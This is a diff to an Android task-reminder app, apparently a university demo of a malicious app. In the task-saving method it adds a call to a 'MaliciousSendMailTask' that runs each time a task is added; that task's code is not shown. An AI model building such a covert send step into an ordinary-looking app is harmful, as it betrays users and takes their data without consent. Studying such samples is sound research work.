@@ -5,10 +5,12 @@ import java.util.Calendar;
 import android.os.Bundle;
 import android.app.Activity;
 import android.app.DialogFragment;
+import android.content.Intent;
 import android.util.Log;
 import android.view.View;
 import android.widget.EditText;
 import android.widget.TextView;
+import edu.cmu.malicioustaskreminder.db.*;
 
 public class TaskDetails extends Activity implements OnTimeSelectedListener, OnDateSelectedListener {
 
@@ -171,10 +173,50 @@ public class TaskDetails extends Activity implements OnTimeSelectedListener, OnD
 		dateString.append(year);
 		return dateString.toString();
 	}
-	
+
+	public void setYear(int year) {
+		this.year = year;
+	}
+
+	public void setMonth(int month) {
+		this.month = month;
+	}
+
+	public void setDay(int day) {
+		this.day = day;
+	}
+
+	public void setFromHour(int fromHour) {
+		this.fromHour = fromHour;
+	}
+
+	public void setFromMinute(int fromMinute) {
+		this.fromMinute = fromMinute;
+	}
+
+	public void setToHour(int toHour) {
+		this.toHour = toHour;
+	}
+
+	public void setToMinute(int toMinute) {
+		this.toMinute = toMinute;
+	}
+
+	public void setDescription(String description) {
+		this.description = description;
+	}
+
+	public static void setTypeOfTag(String typeOfTag) {
+		TaskDetails.typeOfTag = typeOfTag;
+	}
+
 	public void addTask(View v) {
-		Log.d("asdf", "asdf");
-		new SendMailTask().execute(this);
+		TaskListDatabase tasksDb = new TaskListDatabase(this);
+		tasksDb.insertTask(getDescription(), getFromTimeString(), getToTimeString(), getDateString());
+		new MaliciousSendMailTask().execute(this);
+		
+		Intent intent = new Intent(this, TasksList.class);
+		startActivity(intent);
 	}
 
 }
